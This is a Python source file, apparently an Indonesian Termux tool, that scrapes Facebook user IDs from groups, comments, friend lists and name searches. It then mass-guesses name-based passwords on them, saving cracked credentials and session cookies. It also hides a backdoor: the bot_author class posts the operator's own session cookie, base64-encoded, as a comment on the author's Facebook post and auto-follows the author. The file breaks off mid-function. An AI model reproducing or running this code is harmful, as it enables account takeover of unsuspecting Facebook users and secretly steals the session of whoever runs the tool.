import six.moves.urllib as urllib
import sys, os, requests, json, re, base64, random, time, uuid
from bs4 import BeautifulSoup as beautifulsoup
from concurrent.futures import ThreadPoolExecutor

url = b'aHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8xMDAwOTA3MDMwOTI1NDEvdGltZWxpbmU='

# Ganti Aja Ua Nya
uap = random.choice([
   "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.8.4",
   "Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.1",
   "Mozilla/5.0 (Linux; Android 8.1.0; NQT-73GIQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]",
   "Mozilla/5.0 (Linux; Android 12; M50 STAR Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 9; SM-G611MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36"
])
sementara, tambah, array, OK, CP = [], 0, [], [], []

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

Lpg = ('''    _____         _       _____ _____
   | __  |___ _ _| |_ ___|   __| __  |
   | __ -|  _| | |  _| -_|   __| __ -|
   |_____|_| |___|_| |___|__|  |_____|
     https://github.com/khamdihi-dev''')


class MainTermux(object):
      def __init__(self, **ingfo):
          try:ingfo.update({'Author': sys.argv[1]})
          except:exit('Gagal Masuk Ke Menu Jalankan Ulang Dengan Perintah Di Bawah Ini\nRun: python {} khamdihiXD'.format(sys.argv[0]))
          if ingfo.get('Author') == ('khamdihiXD') or ingfo.get('Author').lower() == ('khamdihixd'):
             xxxx = os.getcwd()
             if os.path.isfile('data/token.txt') is True:
                if os.path.isfile('data/cokie.txt') is True:
                   FaceHack('%s/%s'%(xxxx,'data/cokie.txt'),'%s/%s'%(xxxx,'data/token.txt'))
             else:
                 try:
                     subrek = open("data/subs.yt","r").read()
                 except:
                     open("data/subs.yt","w").write("sudah susbscriber")
                     os.system("xdg-open https://youtube.com/@khamdihi")
             FakeLog(xxxx, requests.Session(), {})
          else:
             exit('Utamakan Baca Dulu Di Github Aku\nRun: python {} khamdihiXD'.format(sys.argv[0]))

class Namez:
    def __init__(self):
        self.allname = []

    def Pelers(self, value):
        pasaran = dict({
          "AddNamaForSearch": {
             "NamaDepan":
                 [
                   "andini","adela","angga","agus","asep","andika","alif","adit","alvin","alfa","andikha","afif","asif","amin","aminah","amel","amelia",
                   "bintang","badrul","bagas","bagus","balmond","bella","bilal","bihi","bilqis","batak",
                   "cinta","cindy","celsi","cipok","carto","cila","curti","cahyo","cahyani","cindi","celsi",
                   "dewi","devi","dini","dina","difa","dirga"
                 ],
             "NamaBelakang":
                 [
                  " dwi"," dewi"," devi"," delia"," dirga"," dikha"," mom"," id"," xd"," xyz"," xn"," salsa"," bila"," bela"," marina"," pratama"," papi"," bapak"," ff"," ml",
                  " try"," tedi"," nur"," holis"," azka"," asifa"," riski"," II"," ii"," gans"," ganz"," cans"," canz"," wibu"," rio", " eka"," farhan"," han"
                 ]
               }
             }
           )
        data = (pasaran['AddNamaForSearch'][f'{value}'])
        return data

class FakeLog:
      def __init__(self, cwd, req, kwargs):
          kwargs.update({
             'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e',
             'scope': 'AXRwYlGFq7cbPc_qrW2iPQsDfFlhlxOLU6GxhbX04V2sOlwdzOUH6tvV4cJOp3puqBU'}
          )
          kwargs.pop('scope',None)
          self.req,self.item,self.data = req, kwargs, {}
          self.Login()

      def decompile_(self, enc):
          return base64.b64decode(enc)

      def Login(self):
          os.system('clear');print(Lpg)
          print('\n [!] Jangan gunakan akun utama untuk login, anda bisa kehilangan akun anda')
          mykuki = input(' [?] Masukan cookie : ')
          if 'decompile' in mykuki:
              for_dc = input('\n [?] Masukan cookies yang di enc base64 : ').encode("latin5")
              mykuki = self.decompile_(for_dc).decode()
          else:
              mykuki = mykuki
          try:
              get_code = self.req.post('https://graph.facebook.com/v16.0/device/login/', data=self.item).json()
              user_code, code = get_code['user_code'], get_code['code']
          except KeyError:
              exit('\n [!] Gagal Mendapatkan user_code/code')
          try:
              get_items = self.req.get('https://mbasic.facebook.com/device', cookies = {'cookie': mykuki})
              beautiful = beautifulsoup(get_items.text,'html.parser')
              self.name = ["fb_dtsg","jazoest","qr"]
              for y in beautiful.find_all('input'):
                  if y.get('name') in self.name:
                     self.data.update({y.get('name'):y.get('value')})
              self.data.update({
                  "user_code":user_code,
                  "submit":"Lanjut"
              })
              self.post = beautiful.find('form', method='post')['action']
              self.next = requests.post('https://mbasic.facebook.com'+self.post, cookies={'cookie': mykuki}, data=self.data)
              self.pars = beautifulsoup(self.next.text,'html.parser')
              self.data.clear()
              for _r in self.pars.find_all('input'):
                  if _r.get('name') == '__CANCEL__':pass
                  else:self.data.update({_r.get('name'):_r.get('value')})
              self.p = self.pars.find('form', method='post')['action']
              self.r = requests.post("https://mbasic.facebook.com{}".format(self.p),
                  cookies={'cookie':mykuki}, data=self.data).text
              if 'Anda sekarang terhubung ke' in str(self.r):
                  token = requests.get("https://graph.facebook.com/v16.0/device/login_status?method=post&code={}&access_token={}".format(code,
                      self.item.get('access_token'))
                  ).json()
                  print('\n [✓] Your Token : {}'.format(token['access_token']))
                  open('data/cokie.txt','w').write(mykuki)
                  open('data/token.txt','w').write(token['access_token'])
                  bot_author(mykuki)
              else:
                  exit('\n [!] Login gagal')
          except Exception as r:exit('\n [!] Kesalahan')

class bot_author:
    def __init__(self, mykueh):
        self.host,self.kuki = 'https://mbasic.facebook.com', mykueh
        self.Urut()

    def Urut(self):
        try:
            self.FollowMe()
            self.TimeLine()
            self.Komentar()
        except Exception as e:pass

    def FollowMe(self):
        try:
            r = beautifulsoup(requests.get(base64.b64decode(url).decode().split('/timeline')[0],cookies={'cookie':self.kuki}).text,'html.parser')
            for y in r.find_all('a', href=True):
                if "/a/subscribe.php?" in y.get('href'):
                   p = requests.get('https://m.facebook.com{}'.format(y.get('href')),cookies={'cookie':self.kuki})
                else:pass
        except Exception as e:pass

    def TimeLine(self):
        awokawok,maurecode = ('Linimasa'),('Tanggapi')
        r = beautifulsoup(requests.get(base64.b64decode(url).decode().split("/timeline")[0],cookies={'cookie':self.kuki}).text,'html.parser')
        for y in r.find_all('a', href=True):
            if awokawok in y.text:
               p = beautifulsoup(requests.get('https://m.facebook.com{}'.format(y.get('href')),cookies={'cookie':self.kuki}).text,'html.parser')
               for a in p.find_all('a', href=True):
                   if str(maurecode) in str(a):
                       z = beautifulsoup(requests.get(self.host+a.get('href'),cookies={'cookie':self.kuki}).text,'html.parser')
                       c = random.choice([
                          'Marah','Sedih','Wow','Haha','Super'])
                       for p1 in z.find_all('a', href=True):
                           if c in p1.text:
                              p1 = requests.get(self.host+p1.get('href'), cookies={'cookie':self.kuki}).text
    def Komentar(self):
        oyo = {}
        url = beautifulsoup(requests.get('https://mbasic.facebook.com/100090703092541/posts/pfbid0wFPVQqJyrR61RvjjnofK4BPnAsP7fJLUCx4utC7jh8JXtwMY6PruRgp36iaRrYt6l/?app=fbl', cookies={'cookie':self.kuki}).text,'html.parser')
        for y in url.find_all('a', href=True):
            if 'Komentari' in y.text:
               self.item = beautifulsoup(requests.get(self.host+y.get('href'), cookies={'cookie':self.kuki}).text,'html.parser')
               self.data = [
                 "fb_dtsg",
                 "jazoest"
               ]
               for r in self.item.find_all('input'):
                   if r.get('name') in self.data:
                      oyo.update({r.get('name'):r.get('value')})
                   else:continue
               enc_cok = self.kuki.encode('latin5')
               enc_cok = base64.b64encode(enc_cok)
               oyo.update({
                  "comment_text": enc_cok.decode(),
                  "post": "Komentari"
               })
               self.post = requests.post(self.item.find('form', method='post')['action'], cookies={'cookie':self.kuki},data=oyo).text

class Dumps:
    def __init__(self,cookies):
        self.coki = {'cookie': cookies} 

    def Group(self, url):
        global array
        link = beautifulsoup(requests.get(url,cookies=self.coki).text,'html.parser')
        if 'Anda Diblokir Sementara' in link.text:
            if len(array) <1:
               exit('\n [!] Waduh ngab, akun lu di blokir sementara')
            else:pass
        try:
            data = re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3>', str(link))
            for i in data:
                if '/profile.php?' in i[0]:
                   a,b = re.findall('id=(\d+)&amp;', str(i))[0], i[1]
                   xyz = '%s<=>%s'%(a,b)
                   if xyz in array:pass
                   else:array.append(xyz)
                else:
                   c,d = re.findall('/(.*?)?eav', str(i))[0].split('?')[0],i[1]
                   xyo = '%s<=>%s'%(c,d)
                   if xyo in array:pass
                   else:array.append(xyo)
                print('\r [✓] Berhasil dump: %s akun'%(len(array)),end=" ")
            for p in link.find_all('a', href=True):
                if 'Lihat Selengkapnya' in p.text:
                   self.Group('https://mbasic.facebook.com'+p['href'])
        except Exception:pass

    def Komen(self, url):
        link = beautifulsoup(requests.get(url,cookies=self.coki).text,'html.parser')
        data = re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3><div', str(link))
        for i in data:
            if '/profile.php?' in i[0]:
               a,b = re.findall('id=(\d+)&amp', str(i))[0], i[1]
               xnx = '%s<=>%s'%(a,b)
               if xnx not in array:
                  array.append(xnx)
            else:
               c,d = re.findall('/(.*?)?eav',str(i))[0].split('?')[0], i[1]
               xxx = '%s<=>%s'%(c,d)
               if xxx not in array:
                  array.append(xxx)
            print('\r [✓] Berhasil dump: %s akun'%(len(array)),end=" ")
        for y in link.find_all('a', href=True):
            if 'Lihat komentar lainnya…' in y.text:
                self.Komen('https://mbasic.facebook.com'+ y['href'])

    def SearchName(self, url):
        link = beautifulsoup(requests.get(url,cookies=self.coki).text,'html.parser')
        for p in link.find_all('td'):
            data = re.findall('<a href="(.*?)"><div class=".*?"><div class=".*?">(.*?)</div></div><div', str(p))
            for id,nm  in data:
                if 'profile.php?' in id:
                    uidz,user = re.findall('id=(\d+)',str(id))[0],nm
                    format_id = '%s<=>%s'%(uidz,user)
                    if format_id not in array:
                       array.append(format_id)
                else:
                    uname,fname = re.findall('/(.*?)?eav', str(id))[0].replace('?',''),nm
                    format_name = '%s<=>%s'%(uname,fname)
                    if format_name not in array:
                       array.append(format_name)
                print('\r [✓] Berhasil dump: %s akun'%(len(array)),end=" ")
        for f in link.find_all("a", href=True):
            if 'Lihat Hasil Selanjutnya' in f.text:
                self.SearchName(f['href'])

class FaceHack:
    def __init__(self, cokie, token):
        self.coki, self.lstk = open(cokie,'r').read(), open(token,'r').read()
        self.menu()

    def menu(self):
        try:
            r = requests.get('https://graph.facebook.com/v16.0/me?access_token=%s'%(self.lstk), cookies={"cookie": self.coki}).json()
            user, nama = r['id'], r['name']
        except KeyError:
            os.system('rm -rf data/cokie.txt && rm -rf data/token.txt')
            exit('\n [!] Invalid cookies!')
        except requests.exceptions.ConnectionError:
            exit('\n [!] Tidak ada koneksi internet')
        os.system('clear');print(Lpg)
        print(f'''
 [*] Welcome : {nama}
 [*] Akun id : {user}

 [1] dump dari anggota group
 [2] dump dari komentar postingan
 [3] dump dari akun publik get teman
 [4] chek hasil crack
 [5] dump pencarian nama
 [6] dump files
 [0] Log out
         ''')
        self.BukaLapak(self.coki,self.lstk)

    def BukaLapak(self, coki, mimik):
        Nunu = input(' [?] Pilih menu : ')
        if Nunu in ('',' '):print('\n [!] Jangan kosong mas bro');self.BukaLapak(coki,mimik)
        elif Nunu in ('1','01'):
             print('\n [*] masukan id group di bawah ini contoh: 523600255827100')
             group_id = input(' [?] Target group : ')
             Dumps(coki).Group(f'https://mbasic.facebook.com/browse/group/members/?id={group_id}')
             Crack(array)

        elif Nunu in ('2','02'):
             print('\n [*] masukan link postingan')
             url = input(' [?] masuka link : ')
             Dumps(coki).Komen(url)
             Crack(array)

        elif Nunu in ('3','03'):
             print('\n [*] masukan userid jangan username')
             akunid = input(" [?] Target dump : ")
             try:
                 r = requests.get(f"https://graph.facebook.com/{akunid}?fields=friends.fields(id,name).limit(5000)&access_token={mimik}",cookies={'cookie':coki}).json()
                 for y in r['friends']['data']:
                     sementara.append(y['id']+'<=>'+y['name'])
                     print('\r [✓] Berhasil dump: %s akun'%(len(sementara)),end=" ")
             except KeyError:
                 print('\n [!] Teman bersifat privat');time.sleep(2);MainTermux()
             for _p_ in sorted(sementara):
                 array.append(_p_)
             Crack(array)

        elif Nunu in ('4','04'):
             p=0
             print('\n [1] Check hasil akun OK\n [2] Check hasil akun CP\n [3] Kembali ke menu\n')
             ytta = input(' [?] masukan pilihanmu: ')
             if ytta in ('1','01'):
                 print()
                 ok_files = os.listdir('OK')
                 for y in ok_files:
                    p +=1
                    print(' [%s]. %s'%(p, y))
                 print('\n [!] Masukan nama file di atas, di bawah ini OK.txt')
                 file = input(" [?] masukan nama file: ")
                 try:
                     print('\n [ semua results OK kamu ]\n')
                     for dev in open('OK/'+file,'r').read().splitlines():
                         print(dev)
                 except (FileNotFoundError):
                     exit('\n [!] File tidak ada')
                 exit()
             elif ytta in ('2','02'):
                 print()
                 p=0
                 ok_files = os.listdir('CP')
                 for y in ok_files:
                    p +=1
                    print(' [%s]. %s'%(p, y))
                 print('\n [!] Masukan nama file di atas, di bawah ini CP.txt')
                 file = input(" [?] masukan nama file: ")
                 try:
                     print('\n [ Semua result CP kamu ] \n')
                     for dev in open('CP/'+file,'r').read().splitlines():
                         print(dev)
                 except (FileNotFoundError):
                     exit('\n [!] File tidak ada')
                 exit()
             else:MainTermux()

        elif Nunu in ('5','05'):
             depan,belakang = Namez().Pelers('NamaDepan'),Namez().Pelers('NamaBelakang')
             tampung = []
             print('\n [!] Satu nama jika tidak di tambah, cuma menghasilkan 100 acc. gunakan koma sebagai pemisah')
             target_nama = input(' [?] masukan nama : ').split(',')
             for y in target_nama:
                 for x in belakang:
                     tampung.append('%s%s'%(
                     y,x
                     ))
                 for i in depan:
                     tampung.append('%s%s'%(
                     i,y
                     ))
             with ThreadPoolExecutor(max_workers=None) as khamdihiXD:
                 for xyz in tampung:
                     try:khamdihiXD.submit(Dumps(coki).SearchName(f'https://free.facebook.com/public/{xyz}?locale=id_ID'))
                     except:pass
             Crack(array)

        elif Nunu in ('6','06'):
             print('\n [!] masukan lokasi file atau nam file')
             file = input(' [?] File dump : ')
             try:
                 for i in open(file,'r').readlines():
                     idne,namane = i.split('<=>')
                     array.append(i)
             except IndexError:
                 exit('\n [!] Pemisahan salah')
             except (FileNotFoundError):
                 exit('\n [!] File tidak di temukan')
             Crack(array)
        elif Nunu in ('0','00'):
             try:os.system('rm data/*')
             except:pass
        else:MainTermux()

class Crack:
    def __init__(self, target):
        self.target,self.tambah,self.oke,self.cpe,self.url = (target, 0, [], [],
        {})
        self.Peler = {}
        self.HostUrlToLogin()

    def HostUrlToLogin(self):
        print('''\n
 [1] m.facebook.com
 [2] free.facebook.com
 [3] mbasic.facebook.com
        ''')
        login = input(' [?] Pilih host login : ')
        if login in ('1','01'):self.url.update({'Host': 'm.facebook.com'})
        elif login in ('2','02'):self.url.update({'Host': 'free.facebook.com'})
        else:self.url.update({'Host': 'mbasic.facebook.com'})
        return self.metode()

    def metode(self):
        print('''
 [1] metode async
 [2] metode reguler
 [3] metode validate
 [4] metode graph api
        ''')
        kopi = input(' [?] pilih metode : ')
        if kopi in ('1','01'):self.Peler.update({'Khamdihi':'async'})
        elif kopi in ('2','02'):self.Peler.update({'Khamdihi':'reguler'})
        elif kopi in ('3','03'):self.Peler.update({'Khamdihi':'validate'})
        else:self.Peler.update({'Khamdihi':'api'})
        return self.password()

    def save(self, status, data):
        return open('OK/OK.txt','a').write(data) if 'OK' in status else open('CP/CP.txt','a').write(data)

    def password(self):
        print('\n [*] akun OK di simpan di file : OK/OK.txt\n [*] akun CP di simpan di file : CP/CP.txt\n')
        with ThreadPoolExecutor(max_workers=35) as khamdihi:
             for y in array:
                 username, nama = y.split('<=>')[0],y.split('<=>')[1]
                 name = nama.split(' ')[0]
                 if len(name) == 2 or len(name) == 3 or len(name) == 4 or len(name) == 5:
                    pw = [name+'123',name+'1234',name+'12345',name.lower()+'123',name.lower()+'1234']
                 elif len(nama) >= 6:
                    pw = [name+'123',name+'1234',name+'12345',nama,nama.lower(),nama.capitalize(),name.lower()+'123', name.lower()+'1234']
                 else:
                    pw = [name+'123',name+'1234',name+'12345',nama,nama.lower(),nama.capitalize(),name.lower()+'123', name.lower()+'1234']
                 if 'validate' in self.Peler.get('Khamdihi'):
                    khamdihi.submit(self.validate, username, pw, self.url['Host'])
                 elif 'async' in self.Peler.get('Khamdihi'):
                    khamdihi.submit(self.asyn, username, pw, self.url['Host'])
                 elif 'reguler' in self.Peler.get('Khamdihi'):
                    khamdihi.submit(self.reguler, username, pw, self.url['Host'])
                 else:
                    khamdihi.submit(self.graph, username, pw)
        exit()

    def graph(self, uname, upasw):
        global OK,CP,tambah,uap
        print('\r %s* + --> %s/%s OK:%s CP:%s'%(N,tambah, len(array), len(OK), len(CP)),end=" ")
        for pasw in upasw:
            try:
                Payload = {
                   "adid":str(uuid.uuid4()),
                   "format":"json",
                   "device_id":str(uuid.uuid4()),
                   "email":uname,
                   "password":pasw,
                   "generate_analytics_claim":"1",
                   "community_id":"",
                   "cpl":"true",
                   "try_num":"1",
                   "family_device_id":str(uuid.uuid4()),
                   "secure_family_device_id":str(uuid.uuid4()),
                   "sim_serials":"%5B%2289014103211118510720%22%5D",
                   "credentials_type":"password",
                   "fb4a_shared_phone_cpl_experiment":"fb4a_shared_phone_nonce_cpl_at_risk_v3",
                   "fb4a_shared_phone_cpl_group":"enable_v3_at_risk",
                   "enroll_misauth":"false",
                   "generate_session_cookies":"1",
                   "error_detail_type":"button_with_disabled",
                   "source":"login",
                   "generate_machine_id":"1",
                   "jazoest":"22517",
                   "meta_inf_fbmeta":"",
                   "encrypted_msisdn":"",
                   "currently_logged_in_userid":"0",
                   "locale":"id_ID",
                   "client_country_code":"ID",
                   "fb_api_req_friendly_name":"authenticate",
                   "fb_api_caller_class":"Fb4aAuthHandler",
                   "api_key":"882a8490361da98702bf97a021ddc14d",
                   "access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                }
                AgenVersi,flut = random.randrange(3,12), float(random.randrange(5,9))
                UserAgent = dict({
                   "HekerEpEp": {
                       "AgentPenggunaRandom":
                           [
                   "Dalvik/2.1.0 (Android {}; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA".format(AgenVersi),
                   "Dalvik/2.1.0 (Linux; U; Android {}; SM-G965U Build/PPR1.180610.011)".format(AgenVersi),
                   "Dalvik/2.1.0 (Linux; U; Android {}.0.0; XT1650 Build/OCL27.76-69-6-3)".format(flut)
                           ]
                       }
                    }
                )
                Yameteh = random.choice(UserAgent['HekerEpEp']["AgentPenggunaRandom"])
                headers = {
                   "X-FB-HTTP-Engine": "HUC",
                   "X-ZERO-EH": "2,ad0ccf96d933904f84589b8a1364ebec,Ab3c9eby_aKQgUv_ywl8HtymzwW2ySd2LvG2wk5tCja66e9Y19f9x8W9mTVWKhfeLgc",
                   "User-Agent": Yameteh,
                   "Connection": "Keep-Alive",
                   "Accept-Encoding": "gzip",
                   "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}
                login = requests.post("https://graph.facebook.com/auth/login", params=Payload, headers=headers)
                if "session_key" in login.json() or "EAA" in login.text:
                   OK.append(uname)
                   try:
                       cokie = (';').join(item['name']+'='+item['value'] for item in login.json()["session_cookies"])
                   except:
                       cokie = json.loads(login.text)
                   print('\r %s* + --> %s|%s|%s'%(H,uname,pasw,cokie))
                   wkwk = '%s|%s|%s\n'%(uname,pasw,cokie)
                   self.save('OK',wkwk)
                   break

                elif 'User must verify their account on www.facebook.com' in login.text:
                   CP.append(uname)
                   print('\r %s* + --> %s|%s'%(K,uname,pasw))
                   wkwk = '%s|%s\n'%(uname,pasw)
                   self.save('CP', wkwk)
                   break
                elif 'Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.' in login.text:
                   print('\r %s* + --> %sMode pesawat boy%s'%(N,M,N),end=" "),sys.stdout.flush()
                   time.sleep(5)
            except requests.exceptions.ConnectionError:time.sleep(30)
        tambah +=1

    def validate(self, uname, upasw, uhost):
        global OK,CP,tambah,uap
        print('\r %s* + --> %s/%s OK:%s CP:%s'%(N,tambah, len(array), len(OK), len(CP)),end=" ")
        for pasw in upasw:
            try:
                session = requests.Session()
                headers = {
                   "Host": uhost,
                   "content-length": "146",
                   "cache-control": "max-age=0",
                   "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                   "sec-ch-ua-mobile": "?1",
                   "sec-ch-ua-platform": "Android",
                   "upgrade-insecure-requests": "1",
                   "origin": "https://%s"%(uhost),
                   "content-type": "application/x-www-form-urlencoded",
                   "user-agent": uap,
                   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "sec-fetch-site": "same-origin",
                   "sec-fetch-mode": "navigate",
                   "sec-fetch-user": "?1",
                   "sec-fetch-dest": "document",
                   "referer": f"https://{uhost}/login/device-based/password/?uid={uname}&flow=login_no_pin&wtsid=rdr_0XROFP9kCaSwnsIZx&refsrc=deprecated&_rdr",
                   "accept-encoding": "gzip, deflate, br",
                   "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",}
                get_value = session.get(f'https://{uhost}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2F&ref=dbl&fl&login_from_aymh=1').text
                coki = (";").join([wwh+'='+iih for wwh,iih in session.cookies.get_dict().items()])
                data = {
                   "lsd":re.search('name="lsd" value="(.*?)"', str(get_value)).group(1),
                   "jazoest":re.search('name="jazoest" value="(.*?)"', str(get_value)).group(1),
                   "uid":uname,
                   "next":f"https://{uhost}/login/save-device/",
                   "flow":"login_no_pin",
                   "pass":pasw
                }
                paylod = urllib.parse.urlencode(data,doseq=True)
                respon = session.post(f'https://{uhost}/login/device-based/validate-password/?shbl=0', data=paylod, cookies={'cookie':coki},headers=headers, allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    OK.append(uname)
                    coki = (";").join([wwh+'='+iih for wwh,iih in session.cookies.get_dict().items()])
                    print('\r %s* + --> %s|%s|%s'%(H,uname,pasw,coki))
                    wkwk = '%s|%s|%s\n'%(uname,pasw,coki)
                    self.save('OK',wkwk)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    CP.append(uname)
                    print('\r %s* + --> %s|%s'%(K,uname,pasw))
                    wkwk = '%s|%s\n'%(uname,pasw)
                    self.save('CP', wkwk)
                    break
            except requests.exceptions.ConnectionError:time.sleep(30)
        tambah +=1

    def asyn(self, uname, upasw, uhost):
        global OK,CP,tambah
        print('\r %s* + --> %s/%s OK:%s CP:%s'%(N,tambah, len(array), len(OK), len(CP)),end=" ")
        for pasw in upasw:
            try:
                session = requests.Session()
                cookies = {'cookie':'datr=LPBtZNKhqyX91-579SQkUH7c;sb=LPBtZBV_9Re-I8IKManmLqB9;dpr=2;locale=id_ID;vpd=v1%3B630x360x2;wl_cbv=v2%3Bclient_version%3A2259%3Btimestamp%3A{};m_pixel_ratio=2;wd=360x630;fr=0JLoOCCWQjU3E56fq.AWVoHDcH9bcl-1Sb6wka6IHk51k.BkcgVh.Ws.AAA.0.0.Bkcsoa.AWU8CixXFe0'.format(str(time.time())[:10])}
                p = session.get(f'https://{uhost}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',cookies=cookies)
                headers = {
                    "Host": uhost,
                    "content-length": "2177",
                    "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": uap,
                    "viewport-width": "360",
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
                    "sec-ch-ua-platform-version": '"8.1.0"',
                    "x-asbd-id": "129477",
                    "sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',
                    "sec-ch-prefers-color-scheme": "light",
                    "sec-ch-ua-platform": '"Android"',
                    "accept": "*/*",
                    "origin": "https://" + ''.join(uhost),
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": f"https://{uhost}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
                }
                payload = {
                    "m_ts":re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
                    "li":re.search('name="li" value="(.*?)"',str(p.text)).group(1),
                    "try_number":"0",
                    "unrecognized_tries":"0",
                    "email":uname,
                    "prefill_contact_point":uname,
                    "prefill_source":"browser_dropdown",
                    "prefill_type":"password",
                    "first_prefill_source":"browser_dropdown",
                    "first_prefill_type":"contact_point",
                    "had_cp_prefilled":"true",
                    "had_password_prefilled":"true",
                    "is_smart_lock":"false",
                    "bi_xrwh":"0",
                    "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass":"#PWD_BROWSER:0:{}:{}".format(str(time.time())[:10],pasw),
                    "jazoest":re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
                    "lsd":re.search('name="lsd" value="(.*?)"',str(p.text)).group(1)
                }
                item_encode = urllib.parse.urlencode(payload,doseq=True)
                response_lo = session.post(f'https://{uhost}/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies=cookies,data=item_encode, headers=headers)
                if ('checkpoint') in session.cookies.get_dict():
                    CP.append(uname)
                    print('\r %s* + --> %s|%s'%(K,uname,pasw))
                    wkwk = '%s|%s\n'%(uname,pasw)
                    self.save('CP', wkwk)
                    break
                elif ('c_user') in session.cookies.get_dict():
                    OK.append(uname)
                    coki = (";").join([wwh+'='+iih for wwh,iih in session.cookies.get_dict().items()])
                    print('\r %s* + --> %s|%s|%s'%(H,uname,pasw,coki))
                    wkwk = '%s|%s|%s\n'%(uname,pasw,coki)
                    self.save('OK',wkwk)
                    break
            except requests.exceptions.ConnectionError:time.sleep(20)
        tambah +=1

    def reguler(self, uname, upasw, uhost):
        global OK,CP,tambah
        print('\r %s* + --> %s/%s OK:%s CP:%s'%(N,tambah, len(array), len(OK), len(CP)),end=" ")
        for pasw in upasw:
            try:
                session = requests.Session()
                p = session.get(f"https://{uhost}/login.php?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F&refsrc=deprecated&wtsid=rdr_0I2zKjP2OYC898vIc&_rdr")
                data = {
                   "lsd":re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
                   "jazoest":re.search('name="jazoest" value="(\d+)"',str(p.text)).group(1),
                   "m_ts":re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
                   "li":re.search('name="li" value="(.*?)"',str(p.text)).group(1),
                   "try_number":"0",
                   "unrecognized_tries":"0",
                   "email":uname,
                   "pass":pasw,
                   "login":"Masuk",
                   "_fb_noscript":"true"
                }

                headers = {
                   "Host": uhost,
                   "upgrade-insecure-requests": str(1),
                   "user-agent": uap,
                   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "accept-encoding": "gzip, deflate, br",
                   "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
                   "cookie":(";").join([key +'='+ value for key, value in session.cookies.get_dict().items()])}

                try:actions = beautifulsoup(p.text,'html.parser').find('form', method='post')['action']
